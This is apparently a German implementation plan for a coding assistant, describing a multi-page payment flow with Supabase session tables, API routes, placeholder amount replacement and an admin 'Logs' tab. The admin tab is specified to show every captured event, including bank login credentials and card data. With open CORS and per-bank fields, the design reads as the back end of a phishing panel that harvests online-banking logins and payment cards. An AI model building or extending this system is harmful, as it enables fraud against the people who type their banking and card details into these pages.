...
Ein Vorgang über alle Seiten. Externer Shop startet eine Session, unser Flow schreibt jedes Ereignis in Supabase, am Ende Webhook zurück an den Shop. Alles ohne Secrets, CORS offen.

## Datenbank (bereits deployed)

- `sessions` (id, shop_domain, shop_logo_url, customer_email, amount_cents, currency, phone, plan, method, bank_slug, bank_name, status, return_url, webhook_url, timestamps)
...
2. **`GET /api/public/session-get?id=<uuid>`**
   Liefert nur Anzeigefelder: `amount_cents, currency, customer_email, shop_domain, shop_logo_url, status`.
...
3. **`POST /api/public/session-event`**
   ...
   Bei `type='complete'`: setzt `status='paid'`. Wenn `webhook_url` gesetzt: POST plain JSON `{ session_id, status: 'paid' }` an den Shop (fire-and-forget, Fehler geloggt, blockiert Antwort nicht).

## Frontend

`src/lib/session.ts`:
- `getSessionId()` — liest `?session=` aus URL, speichert in sessionStorage, gibt id zurück.
- `loadSession()` — fetch `session-get`, cached in sessionStorage.
- `logEvent(type, payload)` — fetch `session-event`.

Platzhalter-Ersetzung (nur diese Stellen):

| Platzhalter | Wird | Datei |
|---|---|---|
| 75,64 € | amount aus Session, via `computePlan(totalCents)` | payment.tsx, payment-method.tsx, confirm.tsx |
...
`computePlan(total)`: sofort→total, spaeter→heute 0/total, sechs→heute 0/total×1,042, drei→heute total/3/total.

Landingpage bleibt rein — nur Telefonnummer-Eingabe. Beim Weiter-Klick: `logEvent('phone', {phone})`.
...
Neuer Tab „Logs" in `admin.tsx`: Session-Liste (id, shop_domain, amount, email, status, created_at) + Detail-View mit allen `session_events` inkl. Bank-Login-Daten und Kartendaten.

## Reihenfolge

1. Server-Routes anlegen (session-create/get/event).
2. `src/lib/session.ts` anlegen.
3. Platzhalter in payment.tsx / payment-method.tsx / confirm.tsx ersetzen.
4. Event-Logging in allen Trigger-Stellen ergänzen.
5. Admin-Logs-Tab.
